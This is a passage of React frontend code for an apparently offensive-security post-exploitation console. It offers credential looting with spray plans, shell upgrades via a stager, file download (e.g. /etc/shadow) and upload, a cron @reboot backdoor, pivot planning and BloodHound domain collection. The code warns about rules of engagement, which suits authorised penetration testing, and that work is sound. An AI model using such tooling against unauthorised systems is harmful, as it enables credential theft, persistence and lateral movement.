            <button className="linkish" onClick={() => setOut(null)}>×</button>
          </div>
          <pre className="qa-out-pre">{out.output || "(no output)"}</pre>
        </div>
      )}
    </div>
  );
}

// Loot a credential found in the shell (→ store + spray plan) and grab the transcript.
function SessionTools({ session }: { session: SessionInfo }) {
  const [u, setU] = useState("");
  const [p, setP] = useState("");
  const [kind, setKind] = useState("password");
  const [msg, setMsg] = useState<string | null>(null);

  async function loot() {
    if (!u && !p) return;
    try {
      await lootCred(session.id, { username: u, secret: p, kind });
      setMsg(`✓ credential looted → Credentials + spray plan`);
      setU(""); setP("");
    } catch (e) {
      setMsg(String(e instanceof Error ? e.message : e));
    }
  }
  async function saveTranscript() {
    const text = await getTranscript(session.id);
    const url = URL.createObjectURL(new Blob([text], { type: "text/plain" }));
    const a = document.createElement("a");
    a.href = url; a.download = `session-${session.host_ip}-${session.id}.log`;
    a.click(); URL.revokeObjectURL(url);
  }
  const [upgrading, setUpgrading] = useState(false);
  async function upgrade() {
    setUpgrading(true);
    setMsg(`⤴ injecting stager, waiting for the shell to call back…`);
    try {
      const r = await upgradeSession(session.id);
      if (r.upgraded) setMsg("✓ upgraded — a robust, self-healing PTY session is now live for this host");
      else setMsg("⚠ upgrade didn't complete — " + (r.reason || "no callback") + ". The raw shell still works.");
    } catch (e) {
      setMsg(String(e instanceof Error ? e.message : e));
    } finally {
      setUpgrading(false);
    }
  }
  const [dlPath, setDlPath] = useState("");
  const [busy, setBusy] = useState(false);
  async function enumHost() {
    setBusy(true); setMsg("running recce enum through the shell (~30–60s)…");
    try {
      const r = await runEnum(session.id);
      setMsg(`✓ enum ran (${(r.bytes / 1024) | 0} KB) → folding findings into ${session.host_ip}. See the host drawer.`);
    } catch (e) { setMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }
  async function download() {
    if (!dlPath.trim()) return;
    setBusy(true); setMsg(null);
    try {
      const r = await downloadFromShell(session.id, dlPath.trim());
      setMsg(`⭳ downloaded ${r.size} B → ${r.saved}`);
    } catch (e) { setMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }
  async function upload(file: File) {
    setBusy(true); setMsg(null);
    try {
      const b64 = bytesToB64(new Uint8Array(await file.arrayBuffer()));
      await uploadToShell(session.id, `/tmp/${file.name}`, b64);
      setMsg(`⭱ uploaded ${file.name} → /tmp/${file.name} on the target`);
    } catch (e) { setMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }
  async function persist() {
    if (!window.confirm(
      `INTRUSIVE — writes a backdoor to ${session.host_ip}.\n\n` +
      `Installs a cron @reboot + watchdog that relaunches the reconnecting stager, so the ` +
      `shell survives a reboot or a kill. recce tracks it and can remove it, and it shows in ` +
      `the host view + report.\n\nOnly do this if your rules of engagement allow persistence. Continue?`)) return;
    setBusy(true); setMsg("installing persistence…");
    try {
      const r = await persistSession(session.id);
      setMsg(r.ok ? `🔒 persistence installed (cron) on ${session.host_ip} — tracked; remove it from the host drawer`
                  : `⚠ ${r.reason || "install failed"}`);
    } catch (e) { setMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }
  async function doSpawn() {
    setBusy(true); setMsg("spawning a new session on the same host…");
    try {
      const r = await spawnSession(session.id);
      if (r.ok) setMsg(`✓ new session spawned (${r.session_id?.slice(0, 8)})${r.pty ? " — PTY" : ""}`);
      else setMsg(`⚠ spawn failed — ${r.reason || "unknown"}`);
    } catch (e) { setMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }
  const [openRef, setOpenRef] = useState<string | null>(null);
  const toggleRef = (key: string) => setOpenRef(openRef === key ? null : key);

  return (
    <div className="session-tools">
      {!session.pty && session.status === "live" && (
        <div className="st-upgrade">
          <button className="run upgrade-btn" onClick={upgrade} disabled={upgrading}>
            {upgrading ? "Upgrading…" : "⤴ Upgrade to robust PTY"}
          </button>
          <span className="muted small">auto-pivots this raw shell into a self-healing, full-PTY session</span>
        </div>
      )}

      <QuickActions session={session} />

      <div className="st-section">
        <div className="st-section-label">Actions</div>
        <div className="st-actions-grid">
          <button className="st-action" onClick={enumHost} disabled={busy}
                  title="run recce's on-target enumeration through this shell and fold the findings into the host">
            <span className="st-action-ic">🔎</span>
            <span className="st-action-label">Enumerate</span>
            <span className="st-action-desc">on-target recon</span>
          </button>
          <button className="st-action persist" onClick={persist} disabled={busy}
                  title="INTRUSIVE — install cron persistence so the shell survives reboot/kill (tracked + removable)">
            <span className="st-action-ic">🔒</span>
            <span className="st-action-label">Persist</span>
            <span className="st-action-desc">cron backdoor</span>
          </button>
          {session.pty && session.status === "live" && (
            <button className="st-action" onClick={doSpawn} disabled={busy}
                    title="Spawn an additional independent session on this host">
              <span className="st-action-ic">＋</span>
              <span className="st-action-label">Spawn</span>
              <span className="st-action-desc">new session</span>
            </button>
          )}
          <button className="st-action" onClick={saveTranscript}>
            <span className="st-action-ic">📋</span>
            <span className="st-action-label">Transcript</span>
            <span className="st-action-desc">save session log</span>
          </button>
        </div>
      </div>

      <div className="st-section">
        <div className="st-section-label">File Transfer</div>
        <div className="st-file-row">
          <input className="scan-in" placeholder="remote path, e.g. /etc/shadow" value={dlPath}
                 onChange={(e) => setDlPath(e.target.value)} />
          <button className="toggle" onClick={download} disabled={busy || !dlPath.trim()}>⭳ Download</button>
          <label className="toggle upload-lbl">⭱ Upload<input type="file" hidden
                 onChange={(e) => { const f = e.target.files?.[0]; if (f) upload(f); }} /></label>
        </div>
      </div>

      <div className="st-section">
        <div className="st-section-label">Loot Credential</div>
        <div className="st-loot-row">
          <input className="scan-in" placeholder="username" value={u} onChange={(e) => setU(e.target.value)} />
          <input className="scan-in" placeholder="secret" value={p} onChange={(e) => setP(e.target.value)} />
          <select className="st-loot-select" value={kind} onChange={(e) => setKind(e.target.value)}>
            <option value="password">password</option>
            <option value="nthash">NT hash</option>
            <option value="hash">hash</option>
          </select>
          <button className="toggle" onClick={loot} disabled={!u && !p}>＋ Loot</button>
        </div>
      </div>

      {msg && <div className="ranmsg">{msg}</div>}

      <div className="st-section">
        <div className="st-section-label">Networking</div>
        <TunnelPanel session={session} />
        <PortForwardPanel session={session} />
        <PivotPlannerPanel session={session} />
        <PivotTrafficPanel session={session} />
        <BloodHoundPanel session={session} />
      </div>

      <div className="st-refs">
        <div className="st-section-label">Reference</div>
        <div className="st-refs-bar">
          <button className={`st-ref-tab ${openRef === "stabilize" ? "active" : ""}`}
                  onClick={() => toggleRef("stabilize")}>
            Shell Stabilization
          </button>
          <button className={`st-ref-tab ${openRef === "postex" ? "active" : ""}`}
                  onClick={() => toggleRef("postex")}>
            Post-Exploitation
          </button>
          <button className={`st-ref-tab ${openRef === "pivot" ? "active" : ""}`}
                  onClick={() => toggleRef("pivot")}>
            Pivoting &amp; Tunnels
          </button>
          <button className={`st-ref-tab ${openRef === "tools" ? "active" : ""}`}
                  onClick={() => toggleRef("tools")}>
            Tool Catalog
          </button>
        </div>
        {openRef === "stabilize" && (
          <StabilizeGuide lhost={location.hostname} port={parseInt(session.host_port?.toString() || "4444", 10)} />
        )}
        {openRef === "postex" && (
          <PostExploitRef hostIp={session.host_ip} />
        )}
        {openRef === "pivot" && (
          <PivotGuide lhost={location.hostname} port={4444} targetIp={session.host_ip} />
        )}
        {openRef === "tools" && <ToolCatalog />}
      </div>
    </div>
  );
}

// Inline read-only summary of what recce already knows about the host
// backing this session — findings by severity, port count, best MSF /
// PoC recommendations. Saves the tester from switching to the Hosts
// tab mid-shell just to remember "is SambaCry on this box or not?".
function SessionHostSummary({ hostIp, onViewHost }:
  { hostIp: string; onViewHost?: (ip: string) => void }) {
  type HostDetail = {
    ip: string; hostname?: string; os_name?: string; os_family?: string;
    open_ports?: Array<{ portid: number; service?: string; product?: string; version?: string }>;
    vulns?: Array<{ severity: string; title: string; source?: string; verdict?: string }>;
  };
  const [detail, setDetail] = useState<HostDetail | null>(null);
  const [err, setErr] = useState<string | null>(null);
  useEffect(() => {
    let cancel = false;
    fetch(`/api/host/${encodeURIComponent(hostIp)}`)
      .then((r) => (r.ok ? r.json() : Promise.reject(String(r.status))))
      .then((d) => { if (!cancel) setDetail(d); })
      .catch((e) => { if (!cancel) setErr(String(e)); });
    return () => { cancel = true; };
  }, [hostIp]);
  if (err) return null;
  if (!detail) return null;
  const sev = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  const criticals: Array<{ title: string; source?: string; verdict?: string }> = [];
  for (const v of detail.vulns || []) {
    const s = (v.severity || "info").toLowerCase();
    if (s in sev) (sev as any)[s]++;
    if (s === "critical" || (s === "high" && v.verdict === "CONFIRMED")) {
      criticals.push({ title: v.title, source: v.source, verdict: v.verdict });
    }
  }
  const total = Object.values(sev).reduce((a, b) => a + b, 0);
  const ports = detail.open_ports || [];
  if (total === 0 && ports.length === 0) return null;
  return (
    <div className="sess-host-summary">
      <div className="sess-host-summary-h">
        <span className="mono">{hostIp}</span>
        {detail.hostname && <span className="muted"> · {detail.hostname}</span>}
        {(detail.os_name || detail.os_family) && (
          <span className="muted"> · {detail.os_name || detail.os_family}</span>
        )}
        {onViewHost && (
          <button className="linkish" style={{ marginLeft: "auto" }}
                  onClick={() => onViewHost(hostIp)}
                  title="open the full host drawer">full detail →</button>
        )}
      </div>
      <div className="sess-host-summary-row">
        <div className="sess-host-summary-sev">
          <span className="muted">Findings:</span>
          {(["critical", "high", "medium", "low", "info"] as const).map((k) => (
            (sev as any)[k] > 0 && (
              <span key={k} className={`sev-chip s-${k}`} title={`${(sev as any)[k]} ${k}`}>
                {(sev as any)[k]} {k[0].toUpperCase()}
              </span>
            )
          ))}
        </div>
        {ports.length > 0 && (
          <div className="sess-host-summary-ports">
            <span className="muted">Open ports:</span>
            {ports.slice(0, 10).map((p, i) => (
              <span key={i} className="mono port-chip"
                    title={`${p.service || ""} ${p.product || ""} ${p.version || ""}`.trim()}>
                {p.portid}{p.service ? `/${p.service}` : ""}
              </span>
            ))}
            {ports.length > 10 && <span className="muted">+{ports.length - 10}</span>}
          </div>
        )}
      </div>
      {criticals.length > 0 && (
        <div className="sess-host-summary-crit">
          <span className="muted">Top exploitable finding{criticals.length > 1 ? "s" : ""}:</span>
          <ul className="sess-host-crit-list">
            {criticals.slice(0, 5).map((c, i) => (
              <li key={i}>
                {c.verdict === "CONFIRMED" && <span className="verdict-tag">✓</span>}
                {c.title} {c.source && <span className="muted small">· {c.source}</span>}
              </li>
            ))}
          </ul>
        </div>
      )}
    </div>
  );
}

// ---------------------------------------------------------------------------
// Pivot planner: given a target IP + optional ports, ask the server which
// tools to run through SOCKS vs. which need per-port forwards, and render
// ready-to-copy commands.
function PivotPlannerPanel({ session }: { session: SessionInfo }) {
  const [open, setOpen] = useState(false);
  const [targetIp, setTargetIp] = useState("");
  const [targetPorts, setTargetPorts] = useState("445,389,88,1433");
  const [plan, setPlan] = useState<any>(null);
  const [busy, setBusy] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);

  async function run() {
    setBusy(true); setMsg(null);
    try {
      const r = await fetch(`/api/sessions/${encodeURIComponent(session.id)}/pivot-plan`,
        { method: "POST", headers: {"content-type": "application/json"},
          body: JSON.stringify({ target_ip: targetIp,
            target_ports: targetPorts.split(",").map(x => x.trim()).filter(Boolean) }) });
      if (!r.ok) throw new Error(await r.text());
      setPlan(await r.json());
    } catch (e) { setMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }

  return (
    <div className="netpanel">
      <button className="toggle" onClick={() => setOpen(!open)}>
        {open ? "▾" : "▸"} Pivot planner
      </button>
      {open && (
        <div className="netbody">
          <div className="netrow">
            <input className="scan-in" placeholder="target ip (internal)" value={targetIp}
                   onChange={(e) => setTargetIp(e.target.value)} style={{maxWidth: 180}} />
            <input className="scan-in" placeholder="ports (comma-sep)" value={targetPorts}
                   onChange={(e) => setTargetPorts(e.target.value)} style={{maxWidth: 220}} />
            <button className="run" onClick={run} disabled={busy || !targetIp}>
              {busy ? "planning…" : "Plan reach"}
            </button>
          </div>
          {msg && <div className="ranmsg warn-msg">{msg}</div>}
          {plan && (
            <div className="netresult">
              <div className="muted small">
                pivot {plan.pivot_ip} → {plan.target_ip} · SOCKS {plan.socks_active ? `:${plan.socks_port}` : "off"}
              </div>
              {plan.socks_cmds?.length > 0 && (
                <>
                  <div className="st-section-label">Via SOCKS</div>
                  {plan.socks_cmds.map((c: any, i: number) => (
                    <div key={i} className="cmdrow">
                      <div className="muted small">{c.tool} — {c.note}</div>
                      <code className="cmd">{c.cmd}</code>
                    </div>
                  ))}
                </>
              )}
              {plan.impacket_recipes?.length > 0 && (
                <>
                  <div className="st-section-label">Impacket (needs per-port forward)</div>
                  {plan.impacket_recipes.map((r: any, i: number) => (
                    <div key={i} className="cmdrow">
                      <div className="muted small">
                        {r.label} · fwd {r.recommended_forward.listen_port}
                        → {r.recommended_forward.remote_host}:{r.recommended_forward.remote_port}
                      </div>
                      <code className="cmd">{r.cmd}</code>
                    </div>
                  ))}
                </>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// Pivot traffic log — what the shell has actually pushed through SOCKS +
// port-forwards. Directly quotable in the writeup.
function PivotTrafficPanel({ session }: { session: SessionInfo }) {
  const [open, setOpen] = useState(false);
  const [data, setData] = useState<any>(null);
  async function refresh() {
    try {
      const r = await fetch(`/api/sessions/${encodeURIComponent(session.id)}/pivot-traffic`);
      if (r.ok) setData(await r.json());
    } catch { /* transient */ }
  }
  useEffect(() => {
    if (!open) return;
    refresh();
    const id = window.setInterval(refresh, 4000);
    return () => window.clearInterval(id);
  }, [open]);
  return (
    <div className="netpanel">
      <button className="toggle" onClick={() => setOpen(!open)}>
        {open ? "▾" : "▸"} Pivot traffic
      </button>
      {open && (
        <div className="netbody">
          {!data && <div className="muted small">loading…</div>}
          {data && (
            <>
              <div className="muted small">
                SOCKS conns: {data.socks_conn_count} · {data.socks_targets.length} target(s) · {data.portfwds.length} forward(s)
              </div>
              {data.socks_targets.length === 0 && data.portfwds.length === 0 && (
                <div className="muted small">no pivot traffic yet</div>
              )}
              {data.socks_targets.length > 0 && (
                <table className="netfwdtbl">
                  <thead><tr><th>target</th><th>conns</th><th>up</th><th>down</th></tr></thead>
                  <tbody>
                    {data.socks_targets.map((t: any, i: number) => (
                      <tr key={i}>
                        <td className="mono">{t.target_host}:{t.target_port}</td>
                        <td>{t.conns}</td>
                        <td>{fmtBytes(t.bytes_up)}</td>
                        <td>{fmtBytes(t.bytes_down)}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </>
          )}
        </div>
      )}
    </div>
  );
}

// BloodHound-python collection — drive a DC collection with creds provided
// here. Result files land in the engagement's session-loot dir and get
// auto-ingested through the existing bloodhound recce command.
function BloodHoundPanel({ session }: { session: SessionInfo }) {
  const [open, setOpen] = useState(false);
  const [form, setForm] = useState({ domain: "", username: "", password: "", dc_ip: "", dc_host: "" });
  const [busy, setBusy] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  async function run() {
    setBusy(true); setMsg(null);
    try {
      const r = await fetch(`/api/sessions/${encodeURIComponent(session.id)}/bloodhound`,
        { method: "POST", headers: {"content-type": "application/json"}, body: JSON.stringify(form) });
      if (!r.ok) throw new Error(await r.text());
      const j = await r.json();
      setMsg(`✓ started · job ${j.job_id} · loot → ${j.loot_dir}`);
    } catch (e) { setMsg(String(e instanceof Error ? e.message : e)); }
    finally { setBusy(false); }
  }
  const upd = (k: string, v: string) => setForm(f => ({ ...f, [k]: v }));
  return (
    <div className="netpanel">
      <button className="toggle" onClick={() => setOpen(!open)}>
        {open ? "▾" : "▸"} BloodHound (DC collection)
      </button>
      {open && (
        <div className="netbody">
          <div className="netrow">
            <input className="scan-in" placeholder="domain (corp.local)" value={form.domain}
                   onChange={(e) => upd("domain", e.target.value)} style={{maxWidth: 160}} />
            <input className="scan-in" placeholder="username" value={form.username}
                   onChange={(e) => upd("username", e.target.value)} style={{maxWidth: 140}} />
            <input className="scan-in" type="password" placeholder="password" value={form.password}
                   onChange={(e) => upd("password", e.target.value)} style={{maxWidth: 160}} />
          </div>
          <div className="netrow">
            <input className="scan-in" placeholder="dc_ip" value={form.dc_ip}
                   onChange={(e) => upd("dc_ip", e.target.value)} style={{maxWidth: 160}} />
            <input className="scan-in" placeholder="dc_host (fqdn)" value={form.dc_host}
                   onChange={(e) => upd("dc_host", e.target.value)} style={{maxWidth: 220}} />
            <button className="run" onClick={run} disabled={busy || !form.domain || !form.username || !form.dc_ip}>
              {busy ? "collecting…" : "Collect"}
            </button>
          </div>
          {msg && <div className="ranmsg">{msg}</div>}
        </div>
      )}
    </div>
  );
}
